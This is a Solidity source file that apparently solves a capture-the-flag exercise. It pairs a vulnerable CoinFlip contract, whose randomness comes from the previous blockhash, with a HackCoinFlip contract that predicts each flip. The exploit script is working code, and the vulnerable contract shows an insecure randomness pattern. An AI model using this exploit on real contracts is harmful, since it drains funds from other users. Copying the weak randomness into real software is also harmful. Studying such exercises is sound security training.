/* 
    Using same logic as contract CoinFlip, we make contract HackCoinFlip to predict value of flip coin
        => using hackflip() function, we get 10 consecutive correct guess
        => Getting random number in solidity is tricky. To do that, we can use Chainlink VRF, which 
            uses an oracle, the LINK token, and an on-chain contract to verify that the number is truly random.
            Some other options include using Bitcoin block headers (verified through BTC Relay), RANDAO, or Oraclize).
* */

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol';

contract CoinFlip {
  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

contract HackCoinFlip {
  using SafeMath for uint256;
  CoinFlip public originalContract = CoinFlip(address('Insert instance address of contract CoinFlip here'));
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function hackFlip(bool _guess) public {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      originalContract.flip(_guess);
    } else {
      originalContract.flip(!_guess);
    }
  }
}